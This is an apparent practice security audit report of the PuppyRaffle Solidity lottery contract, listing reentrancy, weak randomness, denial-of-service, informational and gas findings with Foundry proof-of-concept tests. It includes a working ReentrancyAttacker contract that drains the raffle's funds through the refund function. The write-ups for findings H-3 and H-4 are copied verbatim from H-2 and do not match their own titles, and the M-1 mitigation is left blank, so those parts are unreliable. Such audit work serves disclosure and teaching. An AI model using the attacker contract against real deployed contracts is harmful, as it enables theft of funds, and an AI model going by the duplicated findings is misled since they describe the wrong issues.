---
title: PuppyRaffle Audit Report
author: Gopinho
date: Dec 19, 2023
header-includes:
  - \usepackage{titling}
  - \usepackage{graphicx}
---

\begin{titlepage}
\centering
\begin{figure}[h]
\centering
\includegraphics[width=0.5\textwidth]{logo.pdf}
\end{figure}
\vspace{2cm}
{\Huge\bfseries PuppyRaffle Audit Report\par}
\vspace{1cm}
{\Large Version 1.0\par}
\vspace{2cm}
{\Large\itshape profileos.vercel.app\par}
\vfill
{\large \today\par}
\end{titlepage}

\maketitle

<!-- Your report starts here! -->

Prepared by: [Gurpreet](https://profileos.vercel.app)
Lead Researcher:

- Gurpreet

# Table of Contents

- [Table of Contents](#table-of-contents)
- [Protocol Summary](#protocol-summary)
- [Disclaimer](#disclaimer)
- [Risk Classification](#risk-classification)
- [Audit Details](#audit-details)
  - [Scope](#scope)
  - [Roles](#roles)
- [Executive Summary](#executive-summary)
  - [Issues found](#issues-found)
- [Findings](#findings)
  - [High](#high)
    - [\[H-1\] Function `PuppyRaffle::refund` is vulnerable to reenteracy attacks.](#h-1-function-puppyrafflerefund-is-vulnerable-to-reenteracy-attacks)
    - [\[H-2\] Function `PuppyRaffle::selectWinner` uses insecure ways of generating random winner for `winnerIndex`.](#h-2-function-puppyraffleselectwinner-uses-insecure-ways-of-generating-random-winner-for-winnerindex)
    - [\[H-3\] Overflow and Underflow](#h-3-overflow-and-underflow)
    - [\[H-4\] `PuppyRaffle::selectWinner` uses very unsafe require statement, which can lead to not being able to withdraw the fee.](#h-4-puppyraffleselectwinner-uses-very-unsafe-require-statement-which-can-lead-to-not-being-able-to-withdraw-the-fee)
  - [Medium](#medium)
    - [\[M-1\] Function `PuppyRaffle::enterRaffle` is exposed to DOS(Denial of service) attacks, looping through unchecked players array.](#m-1-function-puppyraffleenterraffle-is-exposed-to-dosdenial-of-service-attacks-looping-through-unchecked-players-array)
  - [Informational](#informational)
    - [\[I-1\] Solidity pragma should be specific, not wide](#i-1-solidity-pragma-should-be-specific-not-wide)
    - [\[I-2\] Using outdated versions of Solidity is not recommended.](#i-2-using-outdated-versions-of-solidity-is-not-recommended)
    - [\[I-3\] \_isActivePlayer is never used and should be removed](#i-3-_isactiveplayer-is-never-used-and-should-be-removed)
    - [\[I-4\] Zero address may be erroneously considered an active player](#i-4-zero-address-may-be-erroneously-considered-an-active-player)
  - [Gas](#gas)
    - [\[G-1\] Unchanged variables should be constant or immutable](#g-1-unchanged-variables-should-be-constant-or-immutable)

# Protocol Summary

PuppyRaffle functions as a smart contract lottery system where users enter a pool and winner gets picked randomly. THe fee is splitted between the players and the protocol.

# Disclaimer

The Gurpreet(gopinho) team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

# Risk Classification

|            |        | Impact |        |     |
| ---------- | ------ | ------ | ------ | --- |
|            |        | High   | Medium | Low |
|            | High   | H      | H/M    | M   |
| Likelihood | Medium | H/M    | M      | M/L |
|            | Low    | M      | M/L    | L   |

We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

# Audit Details

**The findings in this documents corrosponds to the following commit hash**

```
e30d199697bbc822b646d76533b66b7d529b8ef5
```

## Scope

```
./src/
#-- PuppyRaffle.sol
```

## Roles

- Owner: Deployer of the contract, has power to change the address of to which fee is sent using `changeFeeAddress` function.

- Player: Participant of the protocol, they enter the raffle through `enterRaffle` function and has ability to get a refund using `refund` function.

# Executive Summary

Manual review including foundry fuzz tests were expended on this contract.

## Issues found

| Severity | Number of issues |
| -------- | ---------------- |
| High     | 4                |
| Medium   | 1                |
| Info     | 4                |
| Gas      | 1                |
| Total    | 10               |

# Findings

## High

### [H-1] Function `PuppyRaffle::refund` is vulnerable to reenteracy attacks.

**Description:** The function `PuppyRaffle::refund` sends an external call before updating the states. This external call can be called multiple times before it ever reaches the `players[playerIndex] = address(0)`.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

**Impact:** Impact of reenteracy attacks can be critical. Attacker can drain the contract funds by calling back to `PuppyRaffle` contract once they receive funds using `fallback()` or `recive()`. Which calls back the `refund()` again before it ever gets a chance to update the balance, in this case removing them from `players[]`. They can drain the contract until there is nothing left.

**Proof of Concept:** Place the following test in `PuppyRaffle.t.sol`.

<details>
<summary> POC </summary>

```javascript


    function test_reenterancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReenterancyAttacker attackerContract = new ReenterancyAttacker(
            puppyRaffle
        );
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract)
            .balance;
        uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

        // executing attack
        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker balance", startingAttackContractBalance);
        console.log("starting puppyRaffle balance", startingPuppyRaffleBalance);

        console.log(
            "ending attacker balance",
            address(attackerContract).balance
        );
        console.log("ending puppyRaffle balance", address(puppyRaffle).balance);
    }

contract ReenterancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 enteranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        enteranceFee = _puppyRaffle.entranceFee();
    }

    //enter raffle
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: enteranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _steal() internal {
        if (address(puppyRaffle).balance >= enteranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _steal();
    }

    receive() external payable {
        _steal();
    }
}

```

</details>

**Recommended Mitigation:** Reenterancy attack can be mitigated by following some best practices when dealing with external calls.

- Make checks first
- Update variables
- Lastly external calls

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-        players[playerIndex] = address(0);
-        emit RaffleRefunded(playerAddress);
    }
```

Another solution for this would be using Openzeppelins `ReentrancyGuard` contract, it provides a modifier to functions to prevent these attacks from happening.

### [H-2] Function `PuppyRaffle::selectWinner` uses insecure ways of generating random winner for `winnerIndex`.

**Description:** The way `selectWinner` is implemented is very insecure way to create a winner. Thas in the past been exploited in the past. ex - Meebit NFTs
The winner can be anticipated in this case and using specific methods attacker can.

**Impact:** Miners can hold the transaction and keep rerunning it until they get the winning index of their own

**Proof of Concept:** Case study Meebit NFTs

**Recommended Mitigation:** Recommended and safe way to generate random number is using Chainlink VRF.

### [H-3] Overflow and Underflow

**Description:** The way `selectWinner` is implemented is very insecure way to create a winner. Thas in the past been exploited in the past. ex - Meebit NFTs
The winner can be anticipated in this case and using specific methods attacker can.

**Impact:** Miners can hold the transaction and keep rerunning it until they get the winning index of their own

**Proof of Concept:** Case study Meebit NFTs

**Recommended Mitigation:** Recommended and safe way to generate random number is using Chainlink VRF.

### [H-4] `PuppyRaffle::selectWinner` uses very unsafe require statement, which can lead to not being able to withdraw the fee.

**Description:** The way `selectWinner` is implemented is very insecure way to create a winner. Thas in the past been exploited in the past. ex - Meebit NFTs
The winner can be anticipated in this case and using specific methods attacker can.

**Impact:** Miners can hold the transaction and keep rerunning it until they get the winning index of their own

**Proof of Concept:** Case study Meebit NFTs

**Recommended Mitigation:** Recommended and safe way to generate random number is using Chainlink VRF.

## Medium

### [M-1] Function `PuppyRaffle::enterRaffle` is exposed to DOS(Denial of service) attacks, looping through unchecked players array.

**Description:** Function `PuppyRaffle::enterRaffle` is prone to DOS attacks. It iterates unbouded through the list `players`, makes it more gas expensive over time could potentially end up being over block gas limit.Every single player added will require additional check to make on top of already existing players resulting directly in increasing gas cost.

**Impact:** Some third party could block access to this function if they run this function multiple times, making it more gas expensive over time could end up being over block gas limit and causing the `PuppyRaffle::enterRaffle` to not be executable anymore.

**Proof of Concept:** Place the following test in `PuppyRaffle.t.sol`.

<details>
<summary> POC </summary>

```javascript

    function test_denialOfService() public {
        // address[] memory players = new address[](1);
        // players[0] = playerOne;
        // puppyRaffle.enterRaffle{value: entranceFee}(players);
        // assertEq(puppyRaffle.players(0), playerOne);
        vm.txGasPrice(1);

        uint256 playerNumber = 500;
        address[] memory players = new address[](playerNumber);
        for (uint256 i = 0; i < playerNumber; i++) {
            players[i] = address(i);
        }

        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasLeft = gasleft();

        uint256 gasUsedFirst500 = (gasStart - gasLeft) * tx.gasprice;

        console.log(gasUsedFirst500);

        // Check gas for next 500 players

        address[] memory playersNext = new address[](playerNumber);
        for (uint256 i = 0; i < playerNumber; i++) {
            playersNext[i] = address(i + playerNumber);
        }

        uint256 gasStartAfter = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(
            playersNext
        );
        uint256 gasLeftAfter = gasleft();

        uint256 gasUsedLast500 = (gasStartAfter - gasLeftAfter) * tx.gasprice;

        console.log(gasUsedLast500);

        assert(gasUsedFirst500 < gasUsedLast500);
    }

```

</details>

**Recommended Mitigation:**

## Informational

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol: Line: 2

### [I-2] Using outdated versions of Solidity is not recommended.

**Description:** Solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:** Deploy with any of the following Solidity versions:

`0.8.18`

The recommendations take into account:

- Risks related to recent releases
- Risks of complex code generation changes
- Risks of new language features
- Risks of known bugs

### [I-3] \_isActivePlayer is never used and should be removed

**Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed.

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```

### [I-4] Zero address may be erroneously considered an active player

**Description:** The `refund` function removes active players from the `players` array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that "This function will allow there to be blank spots in the array". However, this is not taken into account by the `getActivePlayerIndex` function. If someone calls `getActivePlayerIndex` passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the `players` array.

**Recommended Mitigation:** Skip zero addresses when iterating the `players` array in the `getActivePlayerIndex`. Do note that this change would mean that the zero address can _never_ be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `enterRaffle` function.

## Gas

### [G-1] Unchanged variables should be constant or immutable

**Description:** Reading from storage is much more gas expensive than reading from constants and immutable variables.

Constant Instances:

- `PuppyRaffle::commonImageUri` (src/PuppyRaffle.sol#35) should be constant
- `PuppyRaffle::legendaryImageUri` (src/PuppyRaffle.sol#45) should be constant
- `PuppyRaffle::rareImageUri` (src/PuppyRaffle.sol#40) should be constant

Immutable Instances:

- `PuppyRaffle::raffleDuration` (src/PuppyRaffle.sol#21) should be immutable
